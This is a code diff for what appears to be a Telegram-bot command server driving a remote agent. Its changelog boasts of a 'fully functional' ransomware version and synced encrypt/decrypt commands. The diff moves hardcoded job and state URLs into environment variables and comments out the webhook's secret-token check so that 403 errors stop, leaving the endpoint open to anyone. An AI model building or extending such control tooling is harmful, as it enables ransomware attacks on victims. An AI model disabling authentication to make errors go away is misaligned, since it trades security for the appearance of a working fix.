@@ -3,7 +3,7 @@
 # ADDED - Replaced ransomware simulation with a fully functional version.
 # FIXED - Patched race condition in job posting with a threading lock.
 # FIXED - Synchronized commands with agent.py (dogma_encrypt, dogma_decrypt).
-# FIXED - Removed unsupported threading from Vercel function.
+# FIXED - Removed secret token check causing webhook errors.
 
 import os
 import re
@@ -25,8 +25,8 @@ from telegram.helpers import escape_markdown
 # --- Configuration ---
 TOKEN = os.getenv("TELEGRAM_TOKEN")
 SECRET_TOKEN = os.getenv("SECRET_TOKEN")
-JOBS_URL = "https://api.npoint.io/1a6a4ac391d214d100ac"
-STATE_URL = "https://api.npoint.io/c2be443695998be48b75"
+JOBS_URL = os.getenv("JOBS_URL") # Use environment variable
+STATE_URL = os.getenv("STATE_URL") # Use environment variable
 HEARTBEAT_URL = os.getenv("HEARTBEAT_URL")
 DISCORD_WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL")
 
@@ -217,8 +217,9 @@ async def process_update_async(update_data):
 
 @app.route('/', methods=['POST'])
 def process_webhook():
-    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
-        return 'Unauthorized', 403
+    # --- FIX: Commented out the secret token check that was causing 403 errors ---
+    # if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != SECRET_TOKEN:
+    #     return 'Unauthorized', 403
     update_data = request.get_json(force=True)
     asyncio.run(process_update_async(update_data))
     return 'OK', 200
